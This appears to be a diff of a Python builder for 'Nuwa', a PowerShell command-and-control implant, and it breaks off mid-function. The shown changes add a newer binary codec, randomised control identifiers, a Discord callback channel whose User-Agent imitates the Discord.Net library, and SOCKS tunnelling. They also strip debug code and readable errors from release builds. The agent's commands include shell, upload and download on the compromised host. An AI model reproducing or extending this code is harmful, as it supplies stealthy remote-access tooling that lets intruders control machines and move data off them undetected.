@@ -8,9 +8,14 @@ import re
 from collections.abc import Mapping, Sequence
 from dataclasses import dataclass, field
 from datetime import date
+from enum import Enum
 from types import SimpleNamespace
 from typing import Any
 from urllib.parse import urlsplit
+
+from .control_identifiers_v3 import (
+    ResolvedControlProfile, load_default_profile, resolve_control_profile,
+)
 
 
 try:
@@ -21,6 +26,8 @@ try:
         BuildStatus,
         BuildStep,
         C2ParameterDeviation,
+        HideCondition,
+        HideConditionOperand,
         PayloadType,
         SupportedOS,
     )
@@ -34,6 +41,17 @@ except ImportError:  # pragma: no cover - local unit test fallback
         Boolean = "Boolean"
         Dictionary = "Dictionary"
         ChooseOne = "ChooseOne"
+        File = "File"
+
+    class HideConditionOperand(str, Enum):
+        IN = "in"
+
+    @dataclass
+    class HideCondition:
+        name: str
+        operand: HideConditionOperand
+        value: Any = None
+        choices: list[str] | None = None
 
     @dataclass
     class BuildParameter:
@@ -43,6 +61,7 @@ except ImportError:  # pragma: no cover - local unit test fallback
         default_value: Any = None
         required: bool = False
         choices: list[str] | None = None
+        hide_conditions: list[HideCondition] | None = None
 
     class BuildStatus:
         Success = "success"
@@ -118,8 +137,40 @@ PROTECTION_PROFILE_ROOT = PROTECTION_ROOT / "profiles"
 CLM_PROTECTION_ROOT = PROTECTION_ROOT / "clm"
 CLM_PROTECTION_PROFILE_ROOT = CLM_PROTECTION_ROOT / "profiles"
 STAGING_ROOT = AGENT_CODE_ROOT / "staging"
+AGENT_MESSAGE_SCHEMA_V2 = json.loads(
+    pathlib.Path(__file__).with_name("agent_message_schema_v2.json").read_text(encoding="utf-8")
+)
+AGENT_DIAGNOSTIC_CATALOG_V2 = {
+    entry["text"]: entry["code"]
+    for entry in json.loads(
+        pathlib.Path(__file__).with_name("agent_diagnostics_v2.json").read_text(encoding="utf-8")
+    )["diagnostics"]
+}
+PROFILE_CODES = AGENT_MESSAGE_SCHEMA_V2["profiles"]
+SOCKS_PRIVATE_SLOT_NAMES = tuple(
+    "ActivePost AddressType Attempts AwaitingHeartbeatAck Batch BotId BufferedBytes Bulk "
+    "Cleanup CleanupAt CleanupBulkDenied CleanupBulkFailures CleanupFailures CleanupTask "
+    "CleanupTimestamps Client Complete ConnectStartedAt ConnectTask Connections Consumed "
+    "Content Deadline Document Due Epoch Error FailedBatchIds FirstOutboundAt Handle "
+    "HeartbeatMilliseconds Host Http Id Ids Initial LastActivity LastMessageId "
+    "LastOutboundAt NextHeartbeatAt Outbound Pending Port Ports ReadBuffer ReadTask "
+    "Ready ReceiveBuffer ReceiveParts ReceiveTask ReplyCode RequireHeartbeatAck ResumeUrl "
+    "Runspace SeenBatchIds SeenBatchOrder SeenMessageOrder SeenMessages Sequence ServerId "
+    "Servers SessionId Shared State Stop Stream Task Worker WriteQueue WriteTask"
+    .split()
+)
+SOCKS_PRIVATE_SLOT_IDS = {name: index for index, name in enumerate(SOCKS_PRIVATE_SLOT_NAMES, 1)}
+CODEC_PRIVATE_SLOT_IDS = {"Buffer": 1, "Bytes": 2, "Offset": 3, "Key": 4, "Item": 5}
+RESPONSE_PRIVATE_SLOT_IDS = {"Json": 1, "WireBody": 2, "WireBytes": 3, "Uuid": 4, "Decoded": 5}
+RUNTIME_MODE_CODES = {"full-language": 1, "constrained-language": 2}
+FRAMING_MODE_CODES = {"legacy": 0, "raw": 1}
+UNUSED_V2_CONFIG_SETTINGS = (
+    "CodecProfile", "TransportEnvelopeFormat", "TransportPresentation",
+    "TransportProtection", "TransportKeyMode", "TransportNonceStrategy",
+    "DiscordProviderKind", "DiscordListenerId",
+)
 DEFAULT_COMMANDS = ["sleep", "cd", "whoami", "hostname", "exit", "ls", "shell", "upload", "download"]
-POWERSHELL_CODEC_PROFILES = ("binary-v1",)
+POWERSHELL_CODEC_PROFILES = ("binary-v1", "binary-v2")
 FORBIDDEN_RAW_ARTIFACT_PATTERN = re.compile(
     rb"(?:base64|(?<![0-9a-f])b64(?![0-9a-f]))",
     re.IGNORECASE,
@@ -152,6 +203,7 @@ TRANSPORT_PROTECTIONS = (
 )
 TRANSPORT_KEY_MODES = ("single", "directional")
 HTTP_TRANSPORT_NONCE_STRATEGIES = ("profile-default", "random")
+DEFAULT_DISCORD_USER_AGENT = "DiscordBot (https://github.com/discord-net/Discord.Net, v3.20.1)"
 
 
 @dataclass(frozen=True)
@@ -222,7 +274,7 @@ def _ps_literal(value: Any) -> str:
         return str(value)
     if isinstance(value, (list, tuple)):
         return "@(" + ", ".join(_ps_literal(item) for item in value) + ")"
-    text = str(value).replace('"', '`"')
+    text = str(value).replace('`', '``').replace('$', '`$').replace('"', '`"')
     return f'"{text}"'
 
 
@@ -240,6 +292,243 @@ def _ps_hashtable(mapping: dict[str, Any], *, indent: str = "    ") -> str:
 
 def _ps_byte_array(value: bytes) -> str:
     return "[byte[]]@(" + ", ".join(str(item) for item in value) + ")"
+
+
+def _render_v3_schema(profile: ResolvedControlProfile) -> str:
+    prefixes = {
+        "fields": "F", "actions": "A", "commands": "C", "statuses": "S",
+        "host_values": "H", "profiles": "P", "parameter_fields": "Q", "socks_actions": "V",
+    }
+    lines = ["# Payload-selected Nuwa v3 control identifiers."]
+    for namespace, prefix in prefixes.items():
+        for name, value in profile.namespaces[namespace].items():
+            variable = re.sub(r"[^A-Za-z0-9]", "_", name)
+            lines.append(f"$script:Nuwa{prefix}_{variable} = {_ps_literal(value)}")
+    for name, value in profile.namespaces["primitive_tags"].items():
+        lines.append(f"$script:NuwaV3Tag_{name} = {_ps_literal(value)}")
+    for name, value in profile.namespaces["marker_bytes"].items():
+        lines.append(f"$script:NuwaV3Marker_{name} = {_ps_literal(value)}")
+    for name, value in profile.namespaces["diagnostic_header"].items():
+        lines.append(f"$script:NuwaV3DiagHeader_{name} = {_ps_literal(value)}")
+    for name, value in profile.namespaces["diagnostic_positions"].items():
+        lines.append(f"$script:NuwaV3DiagPos_{name} = {_ps_literal(value)}")
+    return "\n".join(lines) + "\n"
+
+
+def _adapt_v3_runtime_source(source: str) -> str:
+    """Retain quantity casts while allowing profile-selected string IDs."""
+    for old, new in (
+        ("[int]$Action", "[object]$Action"),
+        ("[int]$CommandName", "[object]$CommandName"),
+        ("$commandCode = [int]$Task[$script:NuwaF_command]", "$commandCode = $Task[$script:NuwaF_command]"),
+        ("[int]$response[$script:NuwaF_status]", "$response[$script:NuwaF_status]"),
+        ("$whoami -is [int] -and ", ""),
+        ("$hostname -is [int] -and ", ""),
+        ("[int]$profileCode", "$profileCode"),
+        ("[int]$body[$script:NuwaF_action]", "$body[$script:NuwaF_action]"),
+        ("[int]$script:NuwaConfig[$script:NuwaL_C2Profile]", "$script:NuwaConfig[$script:NuwaL_C2Profile]"),
+        ("[int]$script:NuwaConfig[$script:NuwaL_PowerShellRuntime]", "$script:NuwaConfig[$script:NuwaL_PowerShellRuntime]"),
+        ("[int]$script:NuwaConfig[$script:NuwaL_TransportMessageFormat]", "$script:NuwaConfig[$script:NuwaL_TransportMessageFormat]"),
+        ("$diagnostic[0] -is [int] -and $diagnostic[0] -eq 20053",
+         "$diagnostic[$script:NuwaV3DiagPos_tag] -eq $script:NuwaV3DiagHeader_tag"),
+        ("$diagnostic[1] -is [int] -and $diagnostic[1] -eq 1",
+         "$diagnostic[$script:NuwaV3DiagPos_version] -eq $script:NuwaV3DiagHeader_version"),
+    ):
+        source = source.replace(old, new)
+    return source
+
+
+# Append-only local slots. IDs 0-34 are the frozen values in the literal
+# decision register; new slots start at 35.
+LOCAL_SLOT_NAMES = (
+    "BotChannel", "C2Profile", "CallbackHost", "CallbackInterval",
+    "CallbackJitter", "CallbackPort", "CodecProfile", "CurrentDirectory",
+    "DiscordApiOrigin", "DiscordApiVersion", "DiscordCdnOrigin",
+    "DiscordGatewayOrigin", "DiscordListenerId", "DiscordProviderKind",
+    "DiscordToken", "DiscordUserAgent", "ExitRequested", "Headers",
+    "Killdate", "MasterKey", "MessageChecks", "MessageUuidLength",
+    "PayloadUUID", "PostUri", "PowerShellRuntime", "ProxyHost",
+    "ProxyPort", "TimeBetweenChecks", "TransportEnvelopeEnabled",
+    "TransportEnvelopeFormat", "TransportKeyMode", "TransportMessageFormat",
+    "TransportNonceStrategy", "TransportPresentation", "TransportProtection",
+    "CallbackUUID", "ProxyUser", "ProxyPass", "SocksChannel",
+    "ProtectionProfile",
+)
+LOCAL_SLOT_IDS = {name: index for index, name in enumerate(LOCAL_SLOT_NAMES)}
+CRYPTO_SLOT_NAMES = (
+    "OuterUuid", "Key", "ClmAesKey", "ClmAesRoundKeys",
+    "ClmAesRoundWords", "ClmAesDecryptRoundWords", "ClmHmacKey",
+    "ClmHmacInnerPad", "ClmHmacOuterPad",
+)
+CRYPTO_SLOT_IDS = {name: index for index, name in enumerate(CRYPTO_SLOT_NAMES)}
+
+
+def _control_ids(profile: ResolvedControlProfile | None, namespace: str, defaults: dict[str, int]) -> dict[str, int | str]:
+    return dict(profile.namespaces[namespace]) if profile is not None and profile.kind == "binary-v3" else defaults
+
+
+def _ps_empty_local_slots(profile: ResolvedControlProfile | None = None) -> str:
+    ids = _control_ids(profile, "local_slots", LOCAL_SLOT_IDS)
+    return "@{}" if any(isinstance(value, str) for value in ids.values()) else f"[object[]]::new({len(LOCAL_SLOT_NAMES)})"
+
+
+def _ps_empty_crypto_slots(profile: ResolvedControlProfile | None = None) -> str:
+    ids = _control_ids(profile, "crypto_slots", CRYPTO_SLOT_IDS)
+    return "@{}" if any(isinstance(value, str) for value in ids.values()) else f"[object[]]::new({len(CRYPTO_SLOT_NAMES)})"
+
+
+def _render_numeric_local_initialization(config: dict[str, Any], profile: ResolvedControlProfile | None = None) -> list[str]:
+    unknown = set(config) - set(LOCAL_SLOT_IDS)
+    if unknown:
+        raise ValueError(f"Unregistered Nuwa local slot(s): {sorted(unknown)}")
+    constants = "\n".join(
+        f"$script:NuwaL_{name} = {_ps_literal(identifier)}"
+        for name, identifier in _control_ids(profile, "local_slots", LOCAL_SLOT_IDS).items()
+    )
+    constants += "\n" + "\n".join(
+        f"$script:NuwaM_{name.replace('-', '_')} = {_ps_literal(identifier)}"
+        for name, identifier in _control_ids(profile, "runtime_modes", RUNTIME_MODE_CODES).items()
+    )
+    constants += "\n" + "\n".join(
+        f"$script:NuwaF_{name} = {_ps_literal(identifier)}"
+        for name, identifier in _control_ids(profile, "framing_modes", FRAMING_MODE_CODES).items()
+    )
+    constants += "\n" + "\n".join(
+        f"$script:NuwaK_{name} = {_ps_literal(identifier)}"
+        for name, identifier in _control_ids(profile, "crypto_slots", CRYPTO_SLOT_IDS).items()
+    )
+    constants += "\n" + "\n".join(
+        f"$script:NuwaE_{name} = {_ps_literal(identifier)}"
+        for name, identifier in _control_ids(profile, "response_private_slots", RESPONSE_PRIVATE_SLOT_IDS).items()
+    )
+    config_lines = ["$script:NuwaConfig = " + _ps_empty_local_slots(profile)]
+    for name, value in config.items():
+        rendered = (
+            str(PROTECTION_CHOICES.index(value)) if name == "ProtectionProfile"
+            else _ps_hashtable(value) if isinstance(value, dict) else _ps_literal(value)
+        )
+        config_lines.append(f"$script:NuwaConfig[$script:NuwaL_{name}] = {rendered}")
+    state_lines = [
+        "$script:NuwaState = " + _ps_empty_local_slots(profile),
+        "$script:NuwaState[$script:NuwaL_CurrentDirectory] = (Get-Location).Path",
+        "$script:NuwaState[$script:NuwaL_ExitRequested] = $false",
+    ]
+    return [constants, "\n".join(config_lines), "\n".join(state_lines)]
+
+
+def _replace_numeric_local_accesses(source: str, profile: ResolvedControlProfile | None = None) -> str:
+    pattern = re.compile(r"\$script:Nuwa(Config|State)\.([A-Za-z][A-Za-z0-9]*)")
+
+    def replace(match: re.Match[str]) -> str:
+        name = match.group(2)
+        if name in LOCAL_SLOT_IDS:
+            return f"$script:Nuwa{match.group(1)}[$script:NuwaL_{name}]"
+        if name == "ContainsKey":
+            return match.group(0)
+        raise ValueError(f"Unregistered Nuwa local access: {match.group(0)}")
+
+    source = pattern.sub(replace, source)
+    crypto_pattern = re.compile(r"\$script:NuwaCryptoState\.([A-Za-z][A-Za-z0-9]*)")
+
+    def replace_crypto(match: re.Match[str]) -> str:
+        name = match.group(1)
+        if name not in CRYPTO_SLOT_IDS:
+            raise ValueError(f"Unregistered Nuwa crypto slot: {name}")
+        return f"$script:NuwaCryptoState[$script:NuwaK_{name}]"
+
+    source = crypto_pattern.sub(replace_crypto, source)
+    parameter_names = set(AGENT_MESSAGE_SCHEMA_V2["parameter_fields"])
+    parameter_pattern = re.compile(r"\$Parameters\.([a-z][a-z0-9_]*)")
+
+    def replace_parameter(match: re.Match[str]) -> str:
+        name = match.group(1)
+        if name not in parameter_names:
+            raise ValueError(f"Unregistered Nuwa task parameter: {match.group(0)}")
+        return f"$Parameters[$script:NuwaQ_{name}]"
+
+    source = source.replace("$Parameters.ContainsKey('jitter')", "$Parameters.ContainsKey($script:NuwaQ_jitter)")
+    source = parameter_pattern.sub(replace_parameter, source)
+    source = source.replace(
+        "$script:NuwaCryptoState = @{}",
+        "$script:NuwaCryptoState = " + _ps_empty_crypto_slots(profile),
+    )
+    source = source.replace(
+        "$script:NuwaTransportEnvelopeState.MasterKey",
+        "$script:NuwaTransportEnvelopeState[$script:NuwaL_MasterKey]",
+    )
+    return source.replace(
+        "$script:NuwaConfig.ContainsKey('C2Profile')",
+        "$script:NuwaConfig.ContainsKey($script:NuwaL_C2Profile)",
+    )
+
+
+def _render_numeric_codec_module(path: pathlib.Path, profile: ResolvedControlProfile | None = None) -> str:
+    source = _read_text(path)
+    if profile is not None and profile.kind == "binary-v3":
+        # Keep only the bounded byte/varint/float helpers. The v3 module below
+        # supplies the selected tags, map encoding, and runtime entry points.
+        source = re.sub(
+            r"(?ms)^function Add-NuwaBinaryValue \{.*?(?=^function Read-NuwaBinaryBytes \{)",
+            "", source, count=1,
+        )
+        source = re.sub(
+            r"(?ms)^function Read-NuwaBinaryValue \{.*?(?=^# NUWA_SRC_END|\Z)",
+            "", source, count=1,
+        )
+    names = "|".join(CODEC_PRIVATE_SLOT_IDS)
+    bare = re.compile(rf"(?m)(^[ \t]*|[;{{][ \t]*)({names})(?=[ \t]*=)")
+    slot_cast = "" if profile is not None and profile.kind == "binary-v3" else "[int]"
+    source = bare.sub(lambda match: f"{match.group(1)}({slot_cast}$script:NuwaB_{match.group(2)})", source)
+    members = re.compile(r"\$(State|minimum|candidate|entry)\.(Buffer|Bytes|Offset|Key|Item)\b", re.IGNORECASE)
+    source = members.sub(
+        lambda match: f"${match.group(1)}[$script:NuwaB_{next(name for name in CODEC_PRIVATE_SLOT_IDS if name.lower() == match.group(2).lower())}]",
+        source,
+    )
+    source = re.sub(
+        r"(\$entries\[\$cursor\])\.Key\b",
+        r"\1[$script:NuwaB_Key]",
+        source,
+    )
+    assignments = "\n".join(
+        f"$script:NuwaB_{name} = {_ps_literal(identifier)}"
+        for name, identifier in _control_ids(profile, "codec_private_slots", CODEC_PRIVATE_SLOT_IDS).items()
+    )
+    return assignments + "\n" + source
+
+
+def _replace_v2_private_response_records(source: str, profile: ResolvedControlProfile | None = None) -> str:
+    names = "|".join(RESPONSE_PRIVATE_SLOT_IDS)
+    bare = re.compile(rf"(?m)(^[ \t]*|[;{{][ \t]*)({names})(?=[ \t]*=)")
+    slot_cast = "" if profile is not None and profile.kind == "binary-v3" else "[int]"
+    source = bare.sub(lambda match: f"{match.group(1)}({slot_cast}$script:NuwaE_{match.group(2)})", source)
+    members = re.compile(
+        rf"\$(framingCandidate|resolved|resolvedBody)\.({names})\b",
+        re.IGNORECASE,
+    )
+    return members.sub(
+        lambda match: f"${match.group(1)}[$script:NuwaE_{next(name for name in RESPONSE_PRIVATE_SLOT_IDS if name.lower() == match.group(2).lower())}]",
+        source,
+    )
+
+
+def _remove_v2_test_entropy_hook(source: str) -> str:
+    return re.sub(
+        r"(?m)^    if \(\$null -ne \$Context -and \$Context\.ContainsKey\('entropy_bytes'\)\) \{\n"
+        r"(?:.*\n){3}    \}\n",
+        "",
+        source,
+    )
+
+
+def _render_numeric_protection_module(path: pathlib.Path) -> str:
+    source = _read_text(path)
+    # Selection was resolved by the builder; the returned profile name has no reader.
+    return re.sub(
+        r"(?ms)^function Get-NuwaProtectionProfileName \{\n.*?^\}\n\n",
+        "",
+        source,
+        count=1,
+    )
 
 
 def _crypto_field(value: Any, *names: str) -> Any:
@@ -494,14 +783,11 @@ def _protection_source_paths(
     return paths
 
 
-def _staging_source_path(powershell_runtime: str) -> pathlib.Path:
+def _staging_source_path(powershell_runtime: str, codec_profile: str = "binary-v1") -> pathlib.Path:
     """Return the one statically selected RSA staging implementation."""
     runtime = _coerce_powershell_runtime(powershell_runtime)
-    path = (
-        STAGING_ROOT / "rsa.ps1"
-        if runtime == POWERSHELL_RUNTIME_FULL
-        else STAGING_ROOT / "clm" / "rsa.ps1"
-    )
+    filename = "rsa_v2.ps1" if codec_profile == "binary-v2" else "rsa.ps1"
+    path = STAGING_ROOT / filename if runtime == POWERSHELL_RUNTIME_FULL else STAGING_ROOT / "clm" / filename
     if not path.is_file():
         raise ValueError(f"Missing PowerShell staging source '{path.name}'")
     return path
@@ -697,6 +983,13 @@ def _profile_parameter_errors(
         if not isinstance(headers, Mapping):
             errors.append("headers must be a dictionary")
     elif c2_profile_name == "discordx":
+        user_agent = c2_parameters.get("user_agent", DEFAULT_DISCORD_USER_AGENT)
+        if (
+            not isinstance(user_agent, str)
+            or not user_agent.strip()
+            or any(ord(char) < 32 or ord(char) == 127 for char in user_agent)
+        ):
+            errors.append("user_agent must be a nonempty HTTP header value without control characters")
         if not str(c2_parameters.get("discord_token", "") or "").strip():
             errors.append("discord_token is required")
         channel = str(c2_parameters.get("bot_channel", "") or "").strip()
@@ -751,12 +1044,12 @@ def _payload_compatibility_errors(
     transport_envelope: TransportEnvelopeSelection,
 ) -> list[str]:
     errors: list[str] = []
-    if codec_profile != "binary-v1":
-        errors.append("Nuwa inner v1 requires binary-v1 codec_profile")
+    if codec_profile not in POWERSHELL_CODEC_PROFILES:
+        errors.append("Nuwa requires a supported binary codec_profile")
     if framing_mode != "raw":
-        errors.append("Nuwa binary v1 requires use_base64=false")
+        errors.append("Nuwa binary messages require use_base64=false")
     if not transport_envelope.enabled or transport_envelope.envelope_format != "binary-v1":
-        errors.append("Nuwa binary v1 requires a binary-v1 fixed transport envelope")
+        errors.append("Nuwa binary messages require a binary-v1 fixed transport envelope")
     if c2_profile_name == "discordx":
         wire_protocol = str(c2_parameters.get("wire_protocol", "fixed") or "").strip().lower()
         if wire_protocol != "fixed":
@@ -801,9 +1094,95 @@ def _validate_socks_build(**kwargs: Any) -> bool:
     return "socks" in kwargs["command_names"]
 
 
-def _render_socks_agent_main_source(source: str, *, selected: bool) -> str:
+def _socks_source_paths(codec_profile: str) -> tuple[pathlib.Path, ...]:
+    suffix = "_v2" if codec_profile == "binary-v2" else ""
+    return (
+        SOCKS_ROOT / "gateway.ps1",
+        SOCKS_ROOT / f"outbound{suffix}.ps1",
+        SOCKS_ROOT / f"runtime{suffix}.ps1",
+        SOCKS_ROOT / "tcp.ps1",
+        SOCKS_ROOT / f"traffic{suffix}.ps1",
+    )
+
+
+def _render_numeric_socks_module(path: pathlib.Path, profile: ResolvedControlProfile | None = None) -> str:
+    source = _read_text(path)
+    if path.name == "gateway.ps1":
+        source = source.replace("UserAgent.ParseAdd('Nuwa/1.0')", "UserAgent.ParseAdd((Get-NuwaDiscordUserAgent))")
+        source = source.replace("browser = 'Nuwa'; device = 'Nuwa'", "browser = $env:COMPUTERNAME; device = $env:COMPUTERNAME")
+    if path.name == "traffic_v2.ps1":
+        source = source.replace(
+            "$script:NuwaConfig.ProtectionProfile -and\n        [string]$script:NuwaConfig.ProtectionProfile -ne 'none'",
+            "[int]$script:NuwaConfig.ProtectionProfile -ne 0",
+        )
+        for name in ("request", "connecting", "connected"):
+            source = source.replace(f"'{name}'", f"$script:NuwaT_{name}")
+    if path.name == "runtime_v2.ps1":
+        source = source.replace(
+            "else { 'Gateway readiness timed out' }",
+            "else { New-NuwaDiagnosticOutput -Code 1237 }",
+        )
+
+    # These are private hashtable records shared by the SOCKS worker and its
+    # helper functions. Discord's lower-case JSON keys remain at that boundary.
+    names = "|".join(sorted(SOCKS_PRIVATE_SLOT_NAMES, key=len, reverse=True))
+    bare = re.compile(rf"(?m)(^\s*|[;{{]\s*)({names})(?=\s*=)")
+    slot_cast = "" if profile is not None and profile.kind == "binary-v3" else "[int]"
+    source = bare.sub(lambda match: f"{match.group(1)}({slot_cast}$script:NuwaR_{match.group(2)})", source)
+
+    roots_by_file = {
+        "gateway.ps1": ("Gateway", "Worker", "Shared"),
+        "outbound_v2.ps1": ("Worker", "Batch", "batch", "active"),
+        "traffic_v2.ps1": ("Worker", "connection", "request"),
+        "runtime_v2.ps1": ("runtime", "shared", "script:NuwaSocksRuntime"),
+        "tcp.ps1": (),
+    }
+    roots = roots_by_file[path.name]
+    if roots:
+        root_pattern = "|".join(re.escape(root) for root in roots)
+        # Rewrite the second key in nested private records before the first.
+        nested = re.compile(
+            rf"(\$(?:{root_pattern})\.(?:Shared|Pending|ActivePost|CleanupTask))\."
+            r"(Ports|Ready|Stop|Error|Id|Due|Task)\b",
+            re.IGNORECASE,
+        )
+        source = nested.sub(lambda match: f"{match.group(1)}[$script:NuwaR_{match.group(2)}]", source)
+        members = re.compile(rf"\$(?:{root_pattern})\.([A-Za-z][A-Za-z0-9]*)", re.IGNORECASE)
+
+        def replace_member(match: re.Match[str]) -> str:
+            key = match.group(1)
+            canonical = next((name for name in SOCKS_PRIVATE_SLOT_NAMES if name.lower() == key.lower()), None)
+            if canonical is None:
+                return match.group(0)
+            return f"{match.group(0)[:-len(key)-1]}[$script:NuwaR_{canonical}]"
+
+        source = members.sub(replace_member, source)
+    return source
+
+
+def _render_numeric_socks_slot_ids(profile: ResolvedControlProfile | None = None) -> str:
+    fields = "\n".join(
+        f"$script:NuwaR_{name} = {_ps_literal(identifier)}"
+        for name, identifier in _control_ids(profile, "socks_private_slots", SOCKS_PRIVATE_SLOT_IDS).items()
+    )
+    states = _control_ids(profile, "socks_states", {"request": 1, "connecting": 2, "connected": 3})
+    return fields + "\n" + "\n".join(
+        f"$script:NuwaT_{name} = {_ps_literal(value)}" for name, value in states.items()
+    )
+
+
+def _render_socks_agent_main_source(source: str, *, selected: bool, codec_profile: str = "binary-v1") -> str:
     if not selected:
         return source
+    if codec_profile == "binary-v2":
+        return _replace_source_once(
+            source,
+            '        } else {\n            throw ("Unsupported command code {0}" -f $commandCode)\n        }',
+            '        } elseif ($commandCode -eq $script:NuwaC_socks) {\n'
+            '            $response[$script:NuwaF_user_output] = Invoke-NuwaSocks -Parameters $parameters\n'
+            '        } else {\n            throw ("Unsupported command code {0}" -f $commandCode)\n        }',
+            label="selected numeric SOCKS command dispatch",
+        )
     return _replace_source_once(
         source,
         "            default {\n                throw (\"Unsupported command '{0}'\" -f $commandName)\n            }",
@@ -982,14 +1361,76 @@ def _replace_marked_source_region(
     return source[:start] + replacement.rstrip() + "\n" + source[end:]
 
 
-def _render_protected_agent_main_source() -> str:
-    source = _read_text(BASE_CODE_ROOT / "agent_main.ps1")
+def _render_protected_agent_main_source(codec_profile: str = "binary-v1") -> str:
+    source = _read_text(BASE_CODE_ROOT / ("agent_main_v2.ps1" if codec_profile == "binary-v2" else "agent_main.ps1"))
+    action = "$script:NuwaA_checkin" if codec_profile == "binary-v2" else "'checkin'"
     source = _replace_source_once(
         source,
-        "$response = Invoke-NuwaSendMessage -Uuid $script:NuwaConfig.PayloadUUID -Action 'checkin'",
-        "$response = Invoke-NuwaSendMessage -Uuid $script:NuwaCryptoState.OuterUuid -Action 'checkin'",
+        f"$response = Invoke-NuwaSendMessage -Uuid $script:NuwaConfig.PayloadUUID -Action {action}",
+        f"$response = Invoke-NuwaSendMessage -Uuid $script:NuwaCryptoState.OuterUuid -Action {action}",
         label="check-in transport UUID",
     )
+    return source
+
+
+def _replace_v2_fixed_diagnostics(
+    source: str, *, debug_logging: bool = True, allow_v3: bool = False,
+    control_profile: ResolvedControlProfile | None = None,
+) -> str:
+    formatted = {
+        'throw ("Unsupported command code {0}" -f $commandCode)': (
+            'Unsupported command code {0}', '$commandCode'
+        ),
+        'throw ("HTTP request failed with status {0}" -f [int]$webRequest.Status)': (
+            'HTTP request failed with status {0}', '[int]$webRequest.Status'
+        ),
+        "throw ('Discord GET failed with HTTP {0}' -f [int]$response.StatusCode)": (
+            'Discord GET failed with HTTP {0}', '[int]$response.StatusCode'
+        ),
+        "throw ('Discord recovery GET failed with HTTP {0}' -f $status)": (
+            'Discord recovery GET failed with HTTP {0}', '[int]$status'
+        ),
+    }
+    for old, (message, argument) in formatted.items():
+        if old in source:
+            code = AGENT_DIAGNOSTIC_CATALOG_V2[message]
+            source = source.replace(
+                old,
+                f'throw (New-NuwaDiagnosticOutput -Code {code} -Arguments @({argument}))',
+            )
+
+    pattern = re.compile(r"\bthrow\s+'([^'\r\n]+)'", re.IGNORECASE)
+
+    def replace(match: re.Match[str]) -> str:
+        message = match.group(1)
+        try:
+            code = AGENT_DIAGNOSTIC_CATALOG_V2[message]
+        except KeyError as exc:
+            if allow_v3 and ("v3" in message.lower() or message.startswith("Unsupported binary v3")):
+                return match.group(0)
+            raise ValueError(f"Uncataloged Nuwa v2 thrown diagnostic: {message}") from exc
+        return f"throw (New-NuwaDiagnosticOutput -Code {code})"
+
+    source = pattern.sub(replace, source)
+    if not debug_logging:
+        # Only thrown records are failures: success records retain their data.
+        source = re.sub(
+            r"\bthrow\s+\(New-NuwaDiagnosticOutput -Code \d+"
+            r"(?: -Arguments @\([^()\r\n]*\))?\)",
+            f"throw (New-NuwaDiagnosticOutput -Code {AGENT_DIAGNOSTIC_CATALOG_V2['Task failed']})",
+            source,
+        )
+    if allow_v3:
+        if control_profile is None:
+            raise ValueError("Nuwa v3 diagnostic replacement requires a control profile")
+        codes = control_profile.namespaces["diagnostic_codes"]
+        # The resolved value can be embedded directly; no payload-side lookup is needed.
+        def selected_code(match: re.Match[str]) -> str:
+            name = f"code_{match.group(1)}"
+            if name not in codes:
+                raise ValueError(f"Uncataloged Nuwa v3 diagnostic code: {name}")
+            return f"-Code {_ps_literal(codes[name])}"
+        source = re.sub(r"-Code\s+(\d+)\b", selected_code, source)
     return source
 
 
@@ -997,18 +1438,138 @@ def _render_discord_byte_agent_main_source(source: str) -> str:
     return source
 
 
-def _render_staged_agent_runtime_source() -> str:
-    source = _render_protected_agent_main_source()
+def _strip_debug_calls(source: str) -> str:
+    lines = source.splitlines(keepends=True)
+    selected: list[str] = []
+    index = 0
+    while index < len(lines):
+        stripped = lines[index].strip()
+        if not stripped.startswith("Write-NuwaDebug"):
+            selected.append(lines[index])
+            index += 1
+            continue
+        if not re.match(r"^[ \t]*Write-NuwaDebug(?:[ \t]|$)", lines[index]):
+            raise ValueError("Unsupported Nuwa debug call")
+        if stripped == "Write-NuwaDebug (":
+            indent = lines[index][:len(lines[index]) - len(lines[index].lstrip())]
+            index += 1
+            while index < len(lines) and lines[index].strip("\r\n") != indent + ")":
+                index += 1
+            if index == len(lines):
+                raise ValueError("Unclosed multiline Nuwa debug call")
+        index += 1
+    return "".join(selected)
+
+
+def _render_debug_mode(source: str, *, enabled: bool, codec_profile: str) -> str:
+    """Select debug PowerShell at build time, without a runtime debug flag.
+
+    Debug calls in the checked-in modules are standalone statements. A call
+    split across lines starts with exactly ``Write-NuwaDebug (`` and ends with
+    a closing parenthesis at the same indentation. Reject a new shape instead
+    of silently shipping it in a release payload.
+    """
+    lines = source.splitlines(keepends=True)
+    selected: list[str] = []
+    index = 0
+    guard_count = 0
+    expected_guard_count = source.count("$script:NuwaConfig.DebugLogging")
+    guard_pattern = re.compile(
+        r"^([ \t]*)if \((?:\[bool\])?\$script:NuwaConfig\.DebugLogging\) \{\s*$"
+    )
+    while index < len(lines):
+        match = guard_pattern.match(lines[index])
+        if match is None:
+            selected.append(lines[index])
+            index += 1
+            continue
+        guard_count += 1
+        indent = match.group(1)
+        end = index + 1
+        while end < len(lines) and lines[end].strip("\r\n") != indent + "}":
+            end += 1
+        if end == len(lines):
+            raise ValueError("Unclosed Nuwa debug guard")
+        if enabled:
+            selected.extend(lines[index + 1:end])
+        index = end + 1
+    if guard_count != expected_guard_count or guard_count < 1:
+        raise ValueError(
+            f"Expected {expected_guard_count} Nuwa debug guards, found {guard_count}"
+        )
+    source = "".join(selected)
+
+    if not enabled:
+        source, count = re.subn(
+            r"(?ms)^function Write-NuwaDebug \{\n.*?^\}\n(?=\nfunction Resolve-NuwaPath \{)",
+            "",
+            source,
+        )
+        if count != 1:
+            raise ValueError(f"Expected one Nuwa debug function, found {count}")
+
+        # These Discord values are calculated only to format a debug message.
+        discord_debug_values = (
+            "            $matchedClientId = [string](Get-NuwaDiscordObjectProperty -Object $matched -Name 'client_id')\n"
+            "            if ([string]::IsNullOrWhiteSpace($matchedClientId)) {\n"
+            "                $matchedClientId = [string](Get-NuwaDiscordObjectProperty -Object $matched -Name 'sender_id')\n"
+            "            }\n"
+            "            $matchedMessageId = [string](Get-NuwaDiscordCandidateSlot -Candidate $matched -Slot 3)\n"
+        )
+        if "$matchedClientId" in source:
+            if source.count(discord_debug_values) != 1:
+                raise ValueError("Expected one Discord debug value block")
+            source = source.replace(discord_debug_values, "", 1)
+
+        source = _strip_debug_calls(source)
+        if any(token in source for token in ("Write-NuwaDebug", "[Status]", "$matchedClientId", "$matchedMessageId")):
+            raise ValueError("Release Nuwa source retains debug code")
+    if "DebugLogging" in source:
+        raise ValueError("Nuwa source retains a runtime debug flag")
+
+    begin = "        # NUWA_TASK_ERROR_BEGIN"
+    end = "        # NUWA_TASK_ERROR_END"
